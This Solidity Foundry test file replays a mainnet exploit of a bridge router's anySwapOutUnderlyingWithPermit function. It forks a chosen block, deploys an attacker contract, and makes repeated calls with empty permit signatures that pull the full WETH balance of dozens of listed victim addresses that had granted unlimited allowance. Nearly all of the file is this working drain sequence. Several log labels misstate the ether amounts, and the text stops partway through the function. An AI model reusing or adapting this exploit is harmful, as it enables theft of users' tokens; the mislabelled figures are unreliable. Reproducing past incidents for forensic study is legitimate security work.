// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

// https://explorer.phalcon.xyz/tx/eth/0xd07c0f40eec44f7674dddf617cbdec4758f258b531e99b18b8ee3b3b95885e7d
// https://etherscan.io/address/0x4986e9017eA60e7AfCd10D844F85c80912C3863c

interface I {
    function balanceOf(address) external payable returns (uint256);
    function allowance(address, address) external payable returns (uint256);
    function anySwapOutUnderlyingWithPermit(
        address,
        address,
        address,
        uint256,
        uint256,
        uint8,
        bytes32,
        bytes32,
        uint256
    ) external payable;
}

contract X7e01 is Test {
    address immutable r = address(this);
    receive() external payable {}

    function setUp() public pure {
        console2.log("0xd07c0f40eec44f7674dddf617cbdec4758f258b531e99b18b8ee3b3b95885e7d");
    }

    address constant x03e6 = 0x03E6adB71Ec39Af3D68733f1c3f5e54E6E55B7d2;
    address constant x0625 = 0x06259B89d286e114C424d23d7629A5cebD0f6625;
    address constant x0942 = 0x0942086a607b12Fe0Dd5467620E6231C354bA175;
    address constant x0d94 = 0x0d94B6e4c2Aa9383964986020B3534D34885f700;
    address constant x228e = 0x228e093AA0685151eAD3E0bF1939Fd896C065EA1;
    address constant x25c4 = 0x25C47364E34172A17E436f24074f2658344e3d5A;
    address constant x2f9d = 0x2f9d7b5aC943Af78FCFce74FaD17b5dBbf3cFAcE;
    address constant x318c = 0x318c1863d29D1cFFB78aC2B34ba0712A354bf5c1;
    address constant x32a8 = 0x32A8311269c2b5c26e7884bA7490E7931984e5F1;
    address constant x35e0 = 0x35e057137060Cd397bd82e3dfF54BEba480e7012;
    address constant x3716 = 0x3716508118177F589D2F7eCaeC5979dbd3AD9F5b;
    address constant x38b8 = 0x38B807A474553d3f5eb3E93B3927383fbe4Bb2A7;
    address constant x3a10 = 0x3A107d99e03214cBbF473602ee3Cf2E7210361D1;
    address constant x3d78 = 0x3D7849a51A2dA3B3B455ca6a6D604C902F82E7C2;
    address constant x3d7d = 0x3D7d429A7962d5d082A10558592bb7d29eB9211B;
    address constant x42e7 = 0x42E7E3153BFE63ea4f72266B0e963102799DE285;
    address constant x42f7 = 0x42f723B2cD0d9054490d633786Df4bD64fb29CB7;
    address constant x4745 = 0x4745e902A6Bef9D044C0ff89b0c2Ed6877C2a137;
    address constant x489c = 0x489C9a3D952Fd25541c4d5f2a5F626fb085F3478;
    address constant x5136 = 0x5136e623126D3572933FBAfe59AE97f13DD9687A;
    address constant x566a = 0x566aff5248B1f70bB46ddE36969404924C420ac1;
    address constant x636f = 0x000000000000000000636F6e736F6c652e6c6f67;
    address constant x6b7a = 0x6b7a87899490EcE95443e979cA9485CBE7E71522;
    address constant x6cba = 0x6CBa671fAb3B7Be4D702D1960cC072B11df70b5a;
    address constant x71e0 = 0x71E084AB76a113727cdB1d10B0e9B1041a51eD07;
    address constant x71e2 = 0x71E2788B29E032226E6D3b6E5B35490Fd3E478c3;
    address constant x7494 = 0x7494Eb2916CAD8649F4f91eB1DB6E20bE605DAd6;
    address constant x7e36 = 0x7E361e4802161B8AE8b73E3b65Cd7d7571E0be18;
    address constant x7f4b = 0x7F4bae93C21b03836D20933ff55D9F77e5B8d34D;
    address constant x7fc3 = 0x7fC32233e1C0876d80F0deB6d3654c1B76F7196a;
    address constant x81fd = 0x81fdc7bB8CF108AD9411Bd2a1d7FdA5556C5bF1e;
    address constant x827e = 0x827e1EBBA7D486e67a56882dAbD38F8a6b9d1A42;
    address constant x8bc6 = 0x8BC68a501DAb61D43f8c1634E248217351AA607a;
    address constant x8e73 = 0x8E73dB80662571abC3f4F06B7e5feA8C406A7F10;
    address constant x92de = 0x92dE6182A7E277Cd341872854Edca1a7e691e49c;
    address constant x9396 = 0x9396fB6b9010E11524A7F2777ACc61e05A67f091;
    address constant xa05d = 0xA05d29b03b7c31473241c0D71a5366d92cD17D82;
    address constant xa3d6 = 0xa3D6fB4E4812C101123B7C70482D17d75af23544;
    address constant xa5b6 = 0xa5b6Ed1711b0894B37bc9047f3aC141FB7cac490;
    address constant xa646 = 0xa646240B5B13A660657C10818404d9883B0D83B7;
    address constant xa8a8 = 0xa8A83c0A6fAbadf21DbB1Da1d9b24455C56f5573;
    address constant xad8c = 0xAd8C610B166108dbb2AE8F3D1630DB035f35b7BA;
    address constant xb87e = 0xB87e0643fef323A09D1A3B7Eb4a43dc1c9816BB6;
    address constant xbb15 = 0xbb150bC7f3Ba780553abAeFD0421482d0A9Cb53A;
    address constant xbed2 = 0xBED2c135578Ec000eC9A80823DF5cCe916B9e298;
    address constant xc02a = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant xc0bd = 0xC0BD26E808BE6043CEb793d6f582aC7c16f6c47d;
    address constant xc453 = 0xc453703bA1BAcbe9f11d255cf90F0c8ACF16ef63;
    address constant xd7ec = 0xD7ec863643e06a548A6d9f0B0bd9Aa0AB2B80a8e;
    address constant xdd75 = 0xDd7599e1Ae428120de923E2Bb5F49d9B7Fcc4BFD;
    address constant xe7fb = 0xE7fB823aE52982d6aA26f95434ad912110C67247;
    address constant xecda = 0xeCdA563991035AF334dDBA25BD41B82aA81BbDb7;
    address constant xf87e = 0xF87ea1e86f6010e0cAf0956298D2509C5CD6872C;

    address xb4f8;

    function test1() public {
        vm.createSelectFork("http://localhost:18545", 14028473); // tx.blockNumber - 1
        // vm.createSelectFork("http://localhost:18545", bytes32(0xc84f5fb9d23c9f75a2e1479570de15c4865a2e3cbc363fd7d7c92ae04a42b127));

        // https://explorer.phalcon.xyz/tx/eth/0xc84f5fb9d23c9f75a2e1479570de15c4865a2e3cbc363fd7d7c92ae04a42b127
        this.xc84f5fb9();
        // https://explorer.phalcon.xyz/tx/eth/0x791995a65bc6b8b143da6151ff4265f0030c6d12adc5e10b94e80464a9ed4413
        this.x791995a6();
        // https://explorer.phalcon.xyz/tx/eth/0xd07c0f40eec44f7674dddf617cbdec4758f258b531e99b18b8ee3b3b95885e7d
        x0539154b();
    }

    function test2() public {
        vm.createSelectFork("http://localhost:18545", 14028460); // tx.blockNumber - 1
        // https://explorer.phalcon.xyz/tx/eth/0xc84f5fb9d23c9f75a2e1479570de15c4865a2e3cbc363fd7d7c92ae04a42b127
        this.xc84f5fb9();
        vm.warp(1642495112);
        vm.roll(14028466);
        // https://explorer.phalcon.xyz/tx/eth/0x791995a65bc6b8b143da6151ff4265f0030c6d12adc5e10b94e80464a9ed4413
        this.x791995a6();
        vm.warp(1642495221);
        vm.roll(14028473);
        // https://explorer.phalcon.xyz/tx/eth/0xd07c0f40eec44f7674dddf617cbdec4758f258b531e99b18b8ee3b3b95885e7d
        x0539154b();
    }

    function test3() public {
        vm.createSelectFork("http://localhost:18545", 14028473); // tx.blockNumber - 1

        address RECEIVER = address(this);
        vm.warp(1642495221);
        vm.roll(14028474);
        // https://explorer.phalcon.xyz/tx/eth/0xd07c0f40eec44f7674dddf617cbdec4758f258b531e99b18b8ee3b3b95885e7d
        vm.deal(RECEIVER, 10 ether);
        vm.store(
            address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2),
            keccak256(abi.encode(RECEIVER, uint256(3))),
            bytes32(uint256(1000000000000000000000000))
        );
        x0539154b();
    }

    function xc84f5fb9() public {
        xb4f8 = address(new Xb4f8());
    }

    function x0539154b() public {
        xb4f8.call(abi.encodeWithSelector(0x0ad5c04f, xc02a));
        // uint256 v1 = type(uint256).max;
        uint256 v1 = I(xc02a).allowance(x7f4b, x6b7a);
        console2.log("I(xc02a).allowance(x7f4b, x6b7a)\t->", uint256(type(uint256).max));
        // uint256 v2 = 200000000000000000;
        uint256 v2 = I(xc02a).balanceOf(x7f4b);
        console2.log("I(xc02a).balanceOf(x7f4b)\t->", "200000000000000000 (0.2000 ether)");
        I(x6b7a)
            .anySwapOutUnderlyingWithPermit(
                x7f4b,
                xb4f8,
                tx.origin,
                v2,
                100000000000000000000,
                0,
                0x0000000000000000000000000000000000000000000000000000000000000000,
                0x0000000000000000000000000000000000000000000000000000000000000000,
                56
            );
        // uint256 v3 = type(uint256).max;
        uint256 v3 = I(xc02a).allowance(x489c, x6b7a);
        console2.log("I(xc02a).allowance(x489c, x6b7a)\t->", uint256(type(uint256).max));
        // uint256 v4 = 83000000000000000;
        uint256 v4 = I(xc02a).balanceOf(x489c);
        console2.log("I(xc02a).balanceOf(x489c)\t->", "83000000000000000 (0.8300 ether)");
        I(x6b7a)
            .anySwapOutUnderlyingWithPermit(
                x489c,
                xb4f8,
                tx.origin,
                v4,
                100000000000000000000,
                0,
                0x0000000000000000000000000000000000000000000000000000000000000000,
                0x0000000000000000000000000000000000000000000000000000000000000000,
                56
            );
        // uint256 v5 = type(uint256).max;
        uint256 v5 = I(xc02a).allowance(x38b8, x6b7a);
        console2.log("I(xc02a).allowance(x38b8, x6b7a)\t->", uint256(type(uint256).max));
        // uint256 v6 = 63083461143150516;
        uint256 v6 = I(xc02a).balanceOf(x38b8);
        console2.log("I(xc02a).balanceOf(x38b8)\t->", "63083461143150516 (0.6308 ether)");
        I(x6b7a)
            .anySwapOutUnderlyingWithPermit(
                x38b8,
                xb4f8,
                tx.origin,
                v6,
                100000000000000000000,
                0,
                0x0000000000000000000000000000000000000000000000000000000000000000,
                0x0000000000000000000000000000000000000000000000000000000000000000,
                56
            );
        // uint256 v7 = type(uint256).max;
        uint256 v7 = I(xc02a).allowance(xe7fb, x6b7a);
        console2.log("I(xc02a).allowance(xe7fb, x6b7a)\t->", uint256(type(uint256).max));
        // uint256 v8 = 38220611327759190;
        uint256 v8 = I(xc02a).balanceOf(xe7fb);
        console2.log("I(xc02a).balanceOf(xe7fb)\t->", "38220611327759190 (0.3822 ether)");
        I(x6b7a)
            .anySwapOutUnderlyingWithPermit(
                xe7fb,
                xb4f8,
                tx.origin,
                v8,
                100000000000000000000,
                0,
                0x0000000000000000000000000000000000000000000000000000000000000000,
                0x0000000000000000000000000000000000000000000000000000000000000000,
                56
            );
        // uint256 v9 = type(uint256).max;
        uint256 v9 = I(xc02a).allowance(x4745, x6b7a);
        console2.log("I(xc02a).allowance(x4745, x6b7a)\t->", uint256(type(uint256).max));
        // uint256 v10 = 148368400991922222;
        uint256 v10 = I(xc02a).balanceOf(x4745);
        console2.log("I(xc02a).balanceOf(x4745)\t->", "148368400991922222 (0.1483 ether)");
        I(x6b7a)
            .anySwapOutUnderlyingWithPermit(
                x4745,
                xb4f8,
                tx.origin,
                v10,
                100000000000000000000,
                0,
                0x0000000000000000000000000000000000000000000000000000000000000000,
                0x0000000000000000000000000000000000000000000000000000000000000000,
                56
            );
        // uint256 v11 = type(uint256).max;
        uint256 v11 = I(xc02a).allowance(xbb15, x6b7a);
        console2.log("I(xc02a).allowance(xbb15, x6b7a)\t->", uint256(type(uint256).max));
        // uint256 v12 = 1277842561954469991;
        uint256 v12 = I(xc02a).balanceOf(xbb15);
        console2.log("I(xc02a).balanceOf(xbb15)\t->", "1277842561954469991 (1.2778 ether)");
        I(x6b7a)
            .anySwapOutUnderlyingWithPermit(
                xbb15,
                xb4f8,
                tx.origin,
                v12,
                100000000000000000000,
                0,
                0x0000000000000000000000000000000000000000000000000000000000000000,
                0x0000000000000000000000000000000000000000000000000000000000000000,
                56
            );
        // uint256 v13 = type(uint256).max;
        uint256 v13 = I(xc02a).allowance(xecda, x6b7a);
        console2.log("I(xc02a).allowance(xecda, x6b7a)\t->", uint256(type(uint256).max));
        // uint256 v14 = 23000000000000000;
        uint256 v14 = I(xc02a).balanceOf(xecda);
        console2.log("I(xc02a).balanceOf(xecda)\t->", "23000000000000000 (0.2300 ether)");
        I(x6b7a)
            .anySwapOutUnderlyingWithPermit(
                xecda,
                xb4f8,
                tx.origin,
                v14,
                100000000000000000000,
                0,
                0x0000000000000000000000000000000000000000000000000000000000000000,
                0x0000000000000000000000000000000000000000000000000000000000000000,
                56
            );
        // uint256 v15 = type(uint256).max;
        uint256 v15 = I(xc02a).allowance(x8bc6, x6b7a);
        console2.log("I(xc02a).allowance(x8bc6, x6b7a)\t->", uint256(type(uint256).max));
        // uint256 v16 = 401446912272825283;
        uint256 v16 = I(xc02a).balanceOf(x8bc6);
        console2.log("I(xc02a).balanceOf(x8bc6)\t->", "401446912272825283 (0.4014 ether)");
        I(x6b7a)
            .anySwapOutUnderlyingWithPermit(
                x8bc6,
                xb4f8,
                tx.origin,
                v16,
                100000000000000000000,
                0,
                0x0000000000000000000000000000000000000000000000000000000000000000,
                0x0000000000000000000000000000000000000000000000000000000000000000,
                56
            );
        // uint256 v17 = type(uint256).max;
        uint256 v17 = I(xc02a).allowance(xa8a8, x6b7a);
        console2.log("I(xc02a).allowance(xa8a8, x6b7a)\t->", uint256(type(uint256).max));
        // uint256 v18 = 3000000000000000000;
        uint256 v18 = I(xc02a).balanceOf(xa8a8);
        console2.log("I(xc02a).balanceOf(xa8a8)\t->", "3000000000000000000 (3.0 ether)");
        I(x6b7a)
            .anySwapOutUnderlyingWithPermit(
                xa8a8,
                xb4f8,
                tx.origin,
                v18,
                100000000000000000000,
                0,
                0x0000000000000000000000000000000000000000000000000000000000000000,
                0x0000000000000000000000000000000000000000000000000000000000000000,
                56
            );
        // uint256 v19 = type(uint256).max;
        uint256 v19 = I(xc02a).allowance(x228e, x6b7a);
        console2.log("I(xc02a).allowance(x228e, x6b7a)\t->", uint256(type(uint256).max));
        // uint256 v20 = 50797817490741156;
        uint256 v20 = I(xc02a).balanceOf(x228e);
        console2.log("I(xc02a).balanceOf(x228e)\t->", "50797817490741156 (0.5079 ether)");
        {
            I(x6b7a)
                .anySwapOutUnderlyingWithPermit(
                    x228e,
                    xb4f8,
                    tx.origin,
                    50797817490741156,
                    100000000000000000000,
                    0,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    56
                );
            // uint256 v21 = type(uint256).max;
            uint256 v21 = I(xc02a).allowance(x5136, x6b7a);
            console2.log("I(xc02a).allowance(x5136, x6b7a)\t->", uint256(type(uint256).max));
            // uint256 v22 = 5771712257298550716;
            uint256 v22 = I(xc02a).balanceOf(x5136);
            console2.log("I(xc02a).balanceOf(x5136)\t->", "5771712257298550716 (5.7717 ether)");
            I(x6b7a)
                .anySwapOutUnderlyingWithPermit(
                    x5136,
                    xb4f8,
                    tx.origin,
                    v22,
                    100000000000000000000,
                    0,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    56
                );
            // uint256 v23 = type(uint256).max;
            uint256 v23 = I(xc02a).allowance(xc453, x6b7a);
            console2.log("I(xc02a).allowance(xc453, x6b7a)\t->", uint256(type(uint256).max));
            // uint256 v24 = 45000000000000000;
            uint256 v24 = I(xc02a).balanceOf(xc453);
            console2.log("I(xc02a).balanceOf(xc453)\t->", "45000000000000000 (0.4500 ether)");
            I(x6b7a)
                .anySwapOutUnderlyingWithPermit(
                    xc453,
                    xb4f8,
                    tx.origin,
                    v24,
                    100000000000000000000,
                    0,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    56
                );
            // uint256 v25 = type(uint256).max;
            uint256 v25 = I(xc02a).allowance(x0625, x6b7a);
            console2.log("I(xc02a).allowance(x0625, x6b7a)\t->", uint256(type(uint256).max));
            // uint256 v26 = 36000000000000000;
            uint256 v26 = I(xc02a).balanceOf(x0625);
            console2.log("I(xc02a).balanceOf(x0625)\t->", "36000000000000000 (0.3600 ether)");
            I(x6b7a)
                .anySwapOutUnderlyingWithPermit(
                    x0625,
                    xb4f8,
                    tx.origin,
                    v26,
                    100000000000000000000,
                    0,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    56
                );
            // uint256 v27 = type(uint256).max;
            uint256 v27 = I(xc02a).allowance(x2f9d, x6b7a);
            console2.log("I(xc02a).allowance(x2f9d, x6b7a)\t->", uint256(type(uint256).max));
            // uint256 v28 = 78186123528854551;
            uint256 v28 = I(xc02a).balanceOf(x2f9d);
            console2.log("I(xc02a).balanceOf(x2f9d)\t->", "78186123528854551 (0.7818 ether)");
            I(x6b7a)
                .anySwapOutUnderlyingWithPermit(
                    x2f9d,
                    xb4f8,
                    tx.origin,
                    v28,
                    100000000000000000000,
                    0,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    56
                );
            // uint256 v29 = type(uint256).max;
            uint256 v29 = I(xc02a).allowance(x0d94, x6b7a);
            console2.log("I(xc02a).allowance(x0d94, x6b7a)\t->", uint256(type(uint256).max));
            // uint256 v30 = 2000000000000000000;
            uint256 v30 = I(xc02a).balanceOf(x0d94);
            console2.log("I(xc02a).balanceOf(x0d94)\t->", "2000000000000000000 (2.0 ether)");
            I(x6b7a)
                .anySwapOutUnderlyingWithPermit(
                    x0d94,
                    xb4f8,
                    tx.origin,
                    v30,
                    100000000000000000000,
                    0,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    56
                );
            // uint256 v31 = type(uint256).max;
            uint256 v31 = I(xc02a).allowance(xb87e, x6b7a);
            console2.log("I(xc02a).allowance(xb87e, x6b7a)\t->", uint256(type(uint256).max));
            // uint256 v32 = 500000000000000000;
            uint256 v32 = I(xc02a).balanceOf(xb87e);
            console2.log("I(xc02a).balanceOf(xb87e)\t->", "500000000000000000 (0.5000 ether)");
            I(x6b7a)
                .anySwapOutUnderlyingWithPermit(
                    xb87e,
                    xb4f8,
                    tx.origin,
                    v32,
                    100000000000000000000,
                    0,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    56
                );
            // uint256 v33 = type(uint256).max;
            uint256 v33 = I(xc02a).allowance(x03e6, x6b7a);
            console2.log("I(xc02a).allowance(x03e6, x6b7a)\t->", uint256(type(uint256).max));
            // uint256 v34 = 28166546803417361;
            uint256 v34 = I(xc02a).balanceOf(x03e6);
            console2.log("I(xc02a).balanceOf(x03e6)\t->", "28166546803417361 (0.2816 ether)");
            I(x6b7a)
                .anySwapOutUnderlyingWithPermit(
                    x03e6,
                    xb4f8,
                    tx.origin,
                    v34,
                    100000000000000000000,
                    0,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    56
                );
            // uint256 v35 = type(uint256).max;
            uint256 v35 = I(xc02a).allowance(xd7ec, x6b7a);
            console2.log("I(xc02a).allowance(xd7ec, x6b7a)\t->", uint256(type(uint256).max));
            // uint256 v36 = 168959192930120482;
            uint256 v36 = I(xc02a).balanceOf(xd7ec);
            console2.log("I(xc02a).balanceOf(xd7ec)\t->", "168959192930120482 (0.1689 ether)");
            I(x6b7a)
                .anySwapOutUnderlyingWithPermit(
                    xd7ec,
                    xb4f8,
                    tx.origin,
                    v36,
                    100000000000000000000,
                    0,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    56
                );
            // uint256 v37 = type(uint256).max;
            uint256 v37 = I(xc02a).allowance(x8e73, x6b7a);
            console2.log("I(xc02a).allowance(x8e73, x6b7a)\t->", uint256(type(uint256).max));
            // uint256 v38 = 20000000000000000;
            uint256 v38 = I(xc02a).balanceOf(x8e73);
            console2.log("I(xc02a).balanceOf(x8e73)\t->", "20000000000000000 (0.2000 ether)");
            I(x6b7a)
                .anySwapOutUnderlyingWithPermit(
                    x8e73,
                    xb4f8,
                    tx.origin,
                    v38,
                    100000000000000000000,
                    0,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    56
                );
            // uint256 v39 = type(uint256).max;
            uint256 v39 = I(xc02a).allowance(xa5b6, x6b7a);
            console2.log("I(xc02a).allowance(xa5b6, x6b7a)\t->", uint256(type(uint256).max));
            // uint256 v40 = 200000000000000000;
            uint256 v40 = I(xc02a).balanceOf(xa5b6);
            console2.log("I(xc02a).balanceOf(xa5b6)\t->", "200000000000000000 (0.2000 ether)");
        }
        {
            I(x6b7a)
                .anySwapOutUnderlyingWithPermit(
                    xa5b6,
                    xb4f8,
                    tx.origin,
                    200000000000000000,
                    100000000000000000000,
                    0,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    56
                );
            // uint256 v41 = type(uint256).max;
            uint256 v41 = I(xc02a).allowance(x71e2, x6b7a);
            console2.log("I(xc02a).allowance(x71e2, x6b7a)\t->", uint256(type(uint256).max));
            // uint256 v42 = 359037700870283399;
            uint256 v42 = I(xc02a).balanceOf(x71e2);
            console2.log("I(xc02a).balanceOf(x71e2)\t->", "359037700870283399 (0.3590 ether)");
            I(x6b7a)
                .anySwapOutUnderlyingWithPermit(
                    x71e2,
                    xb4f8,
                    tx.origin,
                    v42,
                    100000000000000000000,
                    0,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    56
                );
            // uint256 v43 = type(uint256).max;
            uint256 v43 = I(xc02a).allowance(x3d78, x6b7a);
            console2.log("I(xc02a).allowance(x3d78, x6b7a)\t->", uint256(type(uint256).max));
            // uint256 v44 = 977717887427089358;
            uint256 v44 = I(xc02a).balanceOf(x3d78);
            console2.log("I(xc02a).balanceOf(x3d78)\t->", "977717887427089358 (0.9777 ether)");
            I(x6b7a)
                .anySwapOutUnderlyingWithPermit(
                    x3d78,
                    xb4f8,
                    tx.origin,
                    v44,
                    100000000000000000000,
                    0,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    56
                );
            // uint256 v45 = type(uint256).max;
            uint256 v45 = I(xc02a).allowance(x3d7d, x6b7a);
            console2.log("I(xc02a).allowance(x3d7d, x6b7a)\t->", uint256(type(uint256).max));
            // uint256 v46 = 80000000000000000;
            uint256 v46 = I(xc02a).balanceOf(x3d7d);
            console2.log("I(xc02a).balanceOf(x3d7d)\t->", "80000000000000000 (0.8000 ether)");
            I(x6b7a)
                .anySwapOutUnderlyingWithPermit(
                    x3d7d,
                    xb4f8,
                    tx.origin,
                    v46,
                    100000000000000000000,
                    0,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    56
                );
            // uint256 v47 = type(uint256).max;
            uint256 v47 = I(xc02a).allowance(x0942, x6b7a);
            console2.log("I(xc02a).allowance(x0942, x6b7a)\t->", uint256(type(uint256).max));
            // uint256 v48 = 789360720328842411;
            uint256 v48 = I(xc02a).balanceOf(x0942);
            console2.log("I(xc02a).balanceOf(x0942)\t->", "789360720328842411 (0.7893 ether)");
            I(x6b7a)
                .anySwapOutUnderlyingWithPermit(
                    x0942,
                    xb4f8,
                    tx.origin,
                    v48,
                    100000000000000000000,
                    0,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    56
                );
            // uint256 v49 = type(uint256).max;
            uint256 v49 = I(xc02a).allowance(xdd75, x6b7a);
            console2.log("I(xc02a).allowance(xdd75, x6b7a)\t->", uint256(type(uint256).max));
            // uint256 v50 = 700000000000000000;
            uint256 v50 = I(xc02a).balanceOf(xdd75);
            console2.log("I(xc02a).balanceOf(xdd75)\t->", "700000000000000000 (0.7000 ether)");
            I(x6b7a)
                .anySwapOutUnderlyingWithPermit(
                    xdd75,
                    xb4f8,
                    tx.origin,
                    v50,
                    100000000000000000000,
                    0,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    56
                );
            // uint256 v51 = type(uint256).max;
            uint256 v51 = I(xc02a).allowance(x35e0, x6b7a);
            console2.log("I(xc02a).allowance(x35e0, x6b7a)\t->", uint256(type(uint256).max));
            // uint256 v52 = 2099202791129986431;
            uint256 v52 = I(xc02a).balanceOf(x35e0);
            console2.log("I(xc02a).balanceOf(x35e0)\t->", "2099202791129986431 (2.9920 ether)");
            I(x6b7a)
                .anySwapOutUnderlyingWithPermit(
                    x35e0,
                    xb4f8,
                    tx.origin,
                    v52,
                    100000000000000000000,
                    0,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    56
                );
            // uint256 v53 = type(uint256).max;
            uint256 v53 = I(xc02a).allowance(x7494, x6b7a);
            console2.log("I(xc02a).allowance(x7494, x6b7a)\t->", uint256(type(uint256).max));
            // uint256 v54 = 3101865096182719695;
            uint256 v54 = I(xc02a).balanceOf(x7494);
            console2.log("I(xc02a).balanceOf(x7494)\t->", "3101865096182719695 (3.1018 ether)");
            I(x6b7a)
                .anySwapOutUnderlyingWithPermit(
                    x7494,
                    xb4f8,
                    tx.origin,
                    v54,
                    100000000000000000000,
                    0,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    56
                );
            // uint256 v55 = type(uint256).max;
            uint256 v55 = I(xc02a).allowance(x3716, x6b7a);
            console2.log("I(xc02a).allowance(x3716, x6b7a)\t->", uint256(type(uint256).max));
            // uint256 v56 = 50932699968402125;
            uint256 v56 = I(xc02a).balanceOf(x3716);
            console2.log("I(xc02a).balanceOf(x3716)\t->", "50932699968402125 (0.5093 ether)");
            I(x6b7a)
                .anySwapOutUnderlyingWithPermit(
                    x3716,
                    xb4f8,
                    tx.origin,
                    v56,
                    100000000000000000000,
                    0,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    56
                );
            // uint256 v57 = type(uint256).max;
            uint256 v57 = I(xc02a).allowance(x827e, x6b7a);
            console2.log("I(xc02a).allowance(x827e, x6b7a)\t->", uint256(type(uint256).max));
            // uint256 v58 = 1067000000000000000;
            uint256 v58 = I(xc02a).balanceOf(x827e);
            console2.log("I(xc02a).balanceOf(x827e)\t->", "1067000000000000000 (1.6700 ether)");
            I(x6b7a)
                .anySwapOutUnderlyingWithPermit(
                    x827e,
                    xb4f8,
                    tx.origin,
                    v58,
                    100000000000000000000,
                    0,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    56
                );
            // uint256 v59 = type(uint256).max;
            uint256 v59 = I(xc02a).allowance(xa3d6, x6b7a);
            console2.log("I(xc02a).allowance(xa3d6, x6b7a)\t->", uint256(type(uint256).max));
            // uint256 v60 = 868626129739270227;
            uint256 v60 = I(xc02a).balanceOf(xa3d6);
            console2.log("I(xc02a).balanceOf(xa3d6)\t->", "868626129739270227 (0.8686 ether)");
        }
        {
            I(x6b7a)
                .anySwapOutUnderlyingWithPermit(
                    xa3d6,
                    xb4f8,
                    tx.origin,
                    868626129739270227,
                    100000000000000000000,
                    0,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    56
                );
            // uint256 v61 = type(uint256).max;
            uint256 v61 = I(xc02a).allowance(xf87e, x6b7a);
            console2.log("I(xc02a).allowance(xf87e, x6b7a)\t->", uint256(type(uint256).max));
            // uint256 v62 = 12500000000000000;
            uint256 v62 = I(xc02a).balanceOf(xf87e);
            console2.log("I(xc02a).balanceOf(xf87e)\t->", "12500000000000000 (0.1250 ether)");
            I(x6b7a)
                .anySwapOutUnderlyingWithPermit(
                    xf87e,
                    xb4f8,
                    tx.origin,
                    v62,
                    100000000000000000000,
                    0,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    56
                );
            // uint256 v63 = type(uint256).max;
            uint256 v63 = I(xc02a).allowance(x7e36, x6b7a);
            console2.log("I(xc02a).allowance(x7e36, x6b7a)\t->", uint256(type(uint256).max));
            // uint256 v64 = 109337748768318250;
            uint256 v64 = I(xc02a).balanceOf(x7e36);
            console2.log("I(xc02a).balanceOf(x7e36)\t->", "109337748768318250 (0.1093 ether)");
            I(x6b7a)
                .anySwapOutUnderlyingWithPermit(
                    x7e36,
                    xb4f8,
                    tx.origin,
                    v64,
                    100000000000000000000,
                    0,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    56
                );
            // uint256 v65 = type(uint256).max;
            uint256 v65 = I(xc02a).allowance(xc0bd, x6b7a);
            console2.log("I(xc02a).allowance(xc0bd, x6b7a)\t->", uint256(type(uint256).max));
            // uint256 v66 = 476073977712858772;
            uint256 v66 = I(xc02a).balanceOf(xc0bd);
            console2.log("I(xc02a).balanceOf(xc0bd)\t->", "476073977712858772 (0.4760 ether)");
            I(x6b7a)
                .anySwapOutUnderlyingWithPermit(
                    xc0bd,
                    xb4f8,
                    tx.origin,
                    v66,
                    100000000000000000000,
                    0,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    56
                );
            // uint256 v67 = type(uint256).max;
            uint256 v67 = I(xc02a).allowance(xbed2, x6b7a);
            console2.log("I(xc02a).allowance(xbed2, x6b7a)\t->", uint256(type(uint256).max));
            // uint256 v68 = 30061957613546314;
            uint256 v68 = I(xc02a).balanceOf(xbed2);
            console2.log("I(xc02a).balanceOf(xbed2)\t->", "30061957613546314 (0.3006 ether)");
            I(x6b7a)
                .anySwapOutUnderlyingWithPermit(
                    xbed2,
                    xb4f8,
                    tx.origin,
                    v68,
                    100000000000000000000,
                    0,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    56
                );
            // uint256 v69 = type(uint256).max;
